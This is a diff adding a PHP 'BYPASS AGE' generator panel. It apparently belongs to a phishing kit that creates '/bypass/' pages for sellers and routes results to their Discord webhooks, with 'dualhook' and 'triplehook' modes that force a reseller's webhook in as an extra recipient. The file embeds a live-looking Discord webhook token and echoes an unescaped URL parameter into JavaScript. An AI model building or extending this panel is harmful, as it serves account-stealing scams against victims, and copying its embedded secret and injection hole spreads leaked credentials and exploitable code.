@@ -1,0 +1,570 @@
+<?php
+// page/create.php - Re-styled for premium aesthetic
+$sellers_file = '../sellers.json';
+const OWNER_WEBHOOK = "https://discord.com/api/webhooks/1457023827522621574/QQLHW0EUVMlmZrneF9YXpHsh-_8k6gjMqCPcLoF8eTcMlEP47w2s4r1tVYqGTRbL-cm5";
+
+$admin_user = $_GET['admin'] ?? null;
+
+// Support for /page/create.php/adminName style URLs
+if (!$admin_user && isset($_SERVER['PATH_INFO'])) {
+    $path = trim($_SERVER['PATH_INFO'], '/');
+    if (!empty($path)) {
+        $admin_user = $path;
+    }
+}
+$admin_data = null;
+
+if ($admin_user) {
+    if (file_exists($sellers_file)) {
+        $sellers_data = json_decode(file_get_contents($sellers_file), true) ?: [];
+        $admin_data = $sellers_data[$admin_user] ?? null;
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Safety check: Restore admin context if GET param was lost
+    if (!$admin_data && !empty($_POST['admin_override'])) {
+        $admin_override = $_POST['admin_override'];
+        if (file_exists($sellers_file)) {
+            $sellers_data = json_decode(file_get_contents($sellers_file), true) ?: [];
+            $admin_data = $sellers_data[$admin_override] ?? null;
+        }
+    }
+
+    $username = preg_replace("/[^a-zA-Z0-9_-]/", "", $_POST['username']);
+    $webhook1 = trim($_POST['webhook1'] ?? '');
+    
+    // If created via reseller, webhook2 is forced to reseller's webhook
+    if ($admin_data) {
+        $webhook2 = $admin_data['webhook'];
+        $mode = 'triplehook';
+    } else {
+        $mode = $_POST['mode'] ?? 'dualhook';
+        $webhook2 = null;
+    }
+    
+    $discord_server = trim($_POST['discord_server'] ?? 'https://discord.gg/xDQmmHKAxx');
+    
+    if (empty($username) || empty($webhook1)) {
+        die(json_encode(['success' => false, 'message' => 'Please fill in all required fields.']));
+    }
+
+    $sellers = [];
+    if (file_exists($sellers_file)) {
+        $sellers = json_decode(file_get_contents($sellers_file), true) ?: [];
+    }
+
+    if (isset($sellers[$username])) {
+        die(json_encode(['success' => false, 'message' => 'Directory name already exists.']));
+    }
+
+    $token = bin2hex(random_bytes(16));
+    $sellers[$username] = [
+        'webhook' => $webhook1,
+        'webhook2' => ($mode === 'triplehook' ? $webhook2 : null),
+        'discord_server' => $discord_server,
+        'mode' => $mode,
+        'token' => $token,
+        'created_at' => date('Y-m-d H:i:s')
+    ];
+
+    file_put_contents($sellers_file, json_encode($sellers, JSON_PRETTY_PRINT));
+
+    // Owner Notification
+    $domain = $_SERVER['HTTP_HOST'];
+    $page_url = "https://$domain/bypass/$username";
+    
+    // Generate Admin URL for Discord Embed if applicable
+    $admin_url_display = ($mode === 'triplehook' && !$admin_data) ? "https://$domain/page/create/$username" : null;
+
+    $fields = [
+        ["name" => "Directory", "value" => "`$username`", "inline" => true],
+        ["name" => "Mode", "value" => "`" . strtoupper($mode) . "`", "inline" => true],
+        ["name" => "PAGE NORMAL", "value" => "$page_url", "inline" => false]
+    ];
+
+    if ($admin_url_display) {
+        $fields[] = ["name" => "PAGE GENERATE DUALHOOK ", "value" => "$admin_url_display", "inline" => false];
+    }
+
+    $fields[] = ["name" => "Token", "value" => "||`$token`||", "inline" => false]; // Hidden behind spoiler
+
+    $payload = json_encode([
+        "content" => "",
+        "embeds" => [[
+            "title" => "Bypass Page Created",
+            "color" => 3447003, // Minimalist Blue
+            "fields" => $fields,
+            "footer" => ["text" => "BYPASS AGE"]
+        ]]
+    ]);
+
+    // Notification only sent to the creator (Seller), NOT the Owner or Admin/Reseller.
+    $webhooks_notif = [$webhook1]; 
+    
+    $webhooks_notif = array_unique(array_filter($webhooks_notif));
+
+    foreach ($webhooks_notif as $notif_webhook) {
+        $ch = curl_init($notif_webhook);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+    }
+
+    $admin_url = ($mode === 'triplehook' && !$admin_data) ? "https://$domain/page/create/$username" : null;
+    echo json_encode(['success' => true, 'url' => $page_url, 'token' => $token, 'admin_url' => $admin_url]);
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <base href="<?php echo str_repeat('../', substr_count($_SERVER['REQUEST_URI'], '/') - 1); ?>./">
+    <title>BYPASS AGE - GENERATOR</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=JetBrains+Mono:wght@400;700&family=Rubik+Glitch&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <style>
+        :root {
+            --primary: #00ff41; 
+            --primary-glow: rgba(0, 255, 65, 0.4);
+            --bg-dark: #000000;
+            --glass-bg: rgba(0, 0, 0, 0.9);
+            --glass-border: rgba(0, 255, 65, 0.2);
+            --text-main: #00ff41;
+            --text-dim: #008f11;
+            --font-code: 'JetBrains Mono', monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            padding: 20px;
+        }
+
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        .scanline {
+            width: 100%;
+            height: 100px;
+            z-index: 2;
+            background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(0, 255, 65, 0.01) 50%, rgba(0, 0, 0, 0) 100%);
+            pointer-events: none;
+            position: absolute;
+            bottom: 100%;
+            animation: scanline 8s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% { bottom: 100%; }
+            100% { bottom: -100px; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 500px;
+            padding: 30px;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 4px;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
+            animation: glitch-entry 0.8s ease-out;
+        }
+
+        @keyframes glitch-entry {
+            0% { opacity: 0; transform: scale(0.9) skewX(5deg); }
+            100% { opacity: 1; transform: scale(1) skewX(0); }
+        }
+
+        .header {
+            margin-bottom: 25px;
+            border-bottom: 2px solid var(--glass-border);
+            padding-bottom: 15px;
+            text-align: center;
+        }
+
+        .logo {
+            font-family: 'Rubik Glitch', system-ui;
+            font-size: 1.8rem;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px var(--primary-glow);
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            font-family: var(--font-code);
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .label-row {
+            display: block;
+            font-family: var(--font-code);
+            font-size: 0.8rem;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            color: var(--text-main);
+        }
+
+        .terminal-input {
+            position: relative;
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid var(--glass-border);
+            padding: 2px;
+        }
+
+        .terminal-input::before {
+            content: ">";
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-family: var(--font-code);
+            color: var(--primary);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 12px 12px 30px;
+            background: transparent;
+            border: none;
+            color: var(--primary);
+            font-family: var(--font-code);
+            font-size: 0.9rem;
+            outline: none;
+        }
+
+        input::placeholder {
+            color: rgba(0, 255, 65, 0.2);
+        }
+
+        .mode-toggle {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .mode-btn {
+            flex: 1;
+            padding: 10px;
+            background: transparent;
+            border: 1px solid var(--glass-border);
+            color: var(--text-dim);
+            font-family: var(--font-code);
+            font-size: 0.75rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.2s;
+        }
+
+        .mode-btn.active {
+            background: var(--primary);
+            color: black;
+            border-color: var(--primary);
+            box-shadow: 0 0 15px var(--primary-glow);
+            font-weight: 700;
+        }
+
+        .btn-generate {
+            width: 100%;
+            padding: 15px;
+            background: var(--primary);
+            border: none;
+            color: black;
+            font-family: var(--font-code);
+            font-size: 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-generate:hover {
+            background: #fff;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
+        }
+
+        .btn-generate:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        #result-box {
+            display: none;
+            margin-top: 25px;
+            padding: 15px;
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px dashed var(--primary);
+            font-family: var(--font-code);
+        }
+
+        .result-item {
+            margin-bottom: 15px;
+        }
+
+        .result-label {
+            font-size: 0.7rem;
+            color: var(--text-dim);
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .result-value {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border: 1px solid var(--glass-border);
+            color: #fff;
+            font-size: 0.8rem;
+            word-break: break-all;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .copy-btn {
+            color: var(--primary);
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .copy-btn:hover {
+            color: #fff;
+        }
+
+        /* Custom SWAL for Hacker Theme */
+        .swal2-popup.hacker-popup {
+            background: rgba(0,0,0,0.95) !important;
+            border: 1px solid var(--primary) !important;
+            color: var(--primary) !important;
+            font-family: var(--font-code) !important;
+        }
+        .swal2-confirm.hacker-confirm {
+            background: var(--primary) !important;
+            color: #000 !important;
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrix-canvas"></canvas>
+    <div class="scanline"></div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">BYPASS_GENERATOR</div>
+            <div class="subtitle"><?php echo $admin_data ? "SECURED ACCESS: " . htmlspecialchars($admin_user) : "SYSTEM_INITIALIZED_V1.0"; ?></div>
+        </div>
+
+        <form id="genForm">
+            <?php if ($admin_data): ?>
+                <input type="hidden" name="admin_override" value="<?php echo htmlspecialchars($admin_user); ?>">
+            <?php endif; ?>
+
+            <div class="form-group">
+                <label class="label-row">DIRECTORY_NAME</label>
+                <div class="terminal-input">
+                    <input type="text" name="username" placeholder="ENTER_NAME..." required autocomplete="off">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="label-row">DISCORD_WEBHOOK_URL</label>
+                <div class="terminal-input">
+                    <input type="url" name="webhook1" placeholder="HTTPS://DISCORD.COM/API/WEBHOOKS/..." required autocomplete="off">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="label-row">DISCORD_SERVER_LINK (OPTIONAL)</label>
+                <div class="terminal-input">
+                    <input type="text" name="discord_server" placeholder="HTTPS://DISCORD.GG/..." autocomplete="off">
+                </div>
+            </div>
+
+            <?php if (!$admin_data): ?>
+            <label class="label-row">BYPASS_MODE</label>
+            <div class="mode-toggle">
+                <button type="button" class="mode-btn active" data-mode="dualhook">DUALHOOK</button>
+                <button type="button" class="mode-btn" data-mode="triplehook">TRIPLEHOOK</button>
+                <input type="hidden" name="mode" id="modeInput" value="dualhook">
+            </div>
+            <?php else: ?>
+                <input type="hidden" name="mode" value="triplehook">
+                <div style="color:var(--primary); font-family:var(--font-code); font-size:0.7rem; text-align:center; margin-bottom:20px;">
+                    <i class="fas fa-lock"></i> TRIPLEHOOK_FORCED_BY_ADMIN
+                </div>
+            <?php endif; ?>
+
+            <button type="submit" class="btn-generate" id="btnGen">
+                <i class="fas fa-terminal"></i>
+                GENERATE_SYSTEM
+            </button>
+        </form>
+
+        <div id="result-box">
+            <div class="result-item">
+                <div class="result-label">NORMAL_PAGE_URL</div>
+                <div class="result-value">
+                    <span id="res-url"></span>
+                    <i class="fas fa-copy copy-btn" onclick="copyText('res-url')"></i>
+                </div>
+            </div>
+            
+            <div id="admin-link-area" style="display:none;" class="result-item">
+                <div class="result-label" style="color:var(--primary)">ADMIN_GENERATE_PAGE</div>
+                <div class="result-value">
+                    <span id="res-admin-url"></span>
+                    <i class="fas fa-copy copy-btn" onclick="copyText('res-admin-url')"></i>
+                </div>
+            </div>
+
+            <div class="result-item">
+                <div class="result-label">SECURITY_TOKEN</div>
+                <div class="result-value">
+                    <span id="res-token"></span>
+                    <i class="fas fa-copy copy-btn" onclick="copyText('res-token')"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Matrix Effect
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+        const characters = '01';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        for (let i = 0; i < columns; i++) drops[i] = 1;
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0a3';
+            ctx.font = fontSize + 'px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                const text = characters.charAt(Math.floor(Math.random() * characters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 50);
+
+        // Form Logic
+        $('.mode-btn').click(function() {
+            $('.mode-btn').removeClass('active');
+            $(this).addClass('active');
+            $('#modeInput').val($(this).data('mode'));
+        });
+
+        $('#genForm').on('submit', function(e) {
+            e.preventDefault();
+            const btn = $('#btnGen');
+            const originalContent = btn.html();
+            btn.html('<i class="fas fa-spinner fa-spin"></i> PROCCESSING...').prop('disabled', true);
+
+            $.post('page/create.php<?php echo $admin_user ? "?admin=$admin_user" : ""; ?>', $(this).serialize(), function(res) {
+                try {
+                    const data = JSON.parse(res);
+                    if(data.success) {
+                        $('#res-url').text(data.url);
+                        $('#res-token').text(data.token);
+                        
+                        if(data.admin_url) {
+                            $('#res-admin-url').text(data.admin_url);
+                            $('#admin-link-area').show();
+                        } else {
+                            $('#admin-link-area').hide();
+                        }
+
+                        $('#result-box').fadeIn();
+                        Swal.fire({
+                            title: 'SUCCESS',
+                            text: 'DIRECTORY_INITIALIZED_SUCCESSFULLY',
+                            icon: 'success',
+                            customClass: { popup: 'hacker-popup', confirmButton: 'hacker-confirm' }
+                        });
+                    } else {
+                        Swal.fire({
+                            title: 'ERROR',
+                            text: data.message,
+                            icon: 'error',
+                            customClass: { popup: 'hacker-popup', confirmButton: 'hacker-confirm' }
+                        });
+                    }
+                } catch(e) {
+                    Swal.fire({
+                        title: 'SYSTEM_ERROR',
+                        text: 'FAILED_TO_PARSE_RESPONSE',
+                        icon: 'error',
+                        customClass: { popup: 'hacker-popup', confirmButton: 'hacker-confirm' }
+                    });
+                }
+                btn.html(originalContent).prop('disabled', false);
+            });
+        });
+
+        function copyText(id) {
+            const text = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                Swal.fire({
+                    toast: true,
+                    position: 'top-end',
+                    showConfirmButton: false,
+                    timer: 1500,
+                    icon: 'success',
+                    title: 'COPIED_TO_CLIPBOARD',
+                    customClass: { popup: 'hacker-popup' }
+                });
+            });
+        }
+    </script>
+</body>
+</html>
